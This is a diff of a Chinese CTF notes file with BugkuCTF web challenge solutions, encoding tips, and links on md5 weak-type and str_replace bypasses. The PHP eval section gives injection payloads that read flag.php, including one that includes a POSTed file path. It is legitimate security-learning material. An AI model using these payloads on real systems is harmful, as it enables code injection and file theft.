@@ -1,5 +1,10 @@
 # CTF记录
-
+- 可以直接尝试php代码的网站 https://www.php.cn/dic/29.html
+- 遇事不决
+ 1. 扫目录
+ 2. 抓包看请求
+ 3. 看源码
+ 
 ---
 
 开始时间 2019/10/17
@@ -7,10 +12,11 @@
 ------------
 
 ## 编码总结
--base16：只有16进制的字符串
--base32：base16+=填充
--base64：base32+ ‘/’，‘+’
--md5：标准的md5有16位或32位，16进制字符串
+
+* base16：只有16进制的字符串
+* base32：base16+=填充
+* base64：base32+ ‘/’，‘+’
+* md5：标准的md5有16位或32位，16进制字符串
 
 ---
 
@@ -52,15 +58,15 @@ d、eval函数把字符串当作命令直接执行
 
 e、最后一句把本页代码以高亮语法显示出来
 
-###### 解法1.利用eval
+- 解法1.利用eval
 可以构造payload，有点像数据库注入 hello=1);show_source(%27flag.php%27);var_dump(3 把这个带到eval( "var_dump($a);");中就是eval( "var_dump(1);show_source(%27flag.php%27);var_dump(3);");拆分成执行三条语句了 %27为单引号的ASCII
-###### 解法2.直接将flag.php文件读入变量hello中
+- 解法2.直接将flag.php文件读入变量hello中
 
 ?hello=get_file_contents('flag.php')或
 
 ?hello=file('flag.php')
 
-###### 解法3.利用php://filter + eval
+- 解法3.利用php://filter + eval
 
 http://120.24.86.145:8003/index.php?hello=1);include $_POST['f'];//  （把后面的括号注释掉）
 
@@ -80,3 +86,15 @@ BugkuCTF-web-本地包含 https://blog.csdn.net/huangming1644/article/details/82
 ### 调试类
 #### 点击100万次
 定位对应变量clicks，断电，在控制台赋值即可
+
+---
+### 综合类
+#### 备份是个好习惯 双写绕过str_replace，md5弱类型绕过
+详细题解https://blog.csdn.net/qq_42133828/article/details/84871544
+1. 点击网址后可以看到一串16进制字符串，初步判断可以是base16或者md5
+2. 扫文件目录（备份提示）发现有index.php.bak
+3. 点击后发现要求下一个源码，看了源码后有几个点，首先是要绕过把key变成空字符，其次是要md5绕过
+
+$_SERVER['REQUEST_URI'] 的解释 https://baike.baidu.com/item/%24_SERVER/4897514
+parse_str函数缺陷 https://cloud.tencent.com/developer/article/1370529
+md5弱类型绕过 https://blog.csdn.net/dongyanwen6036/article/details/77658983
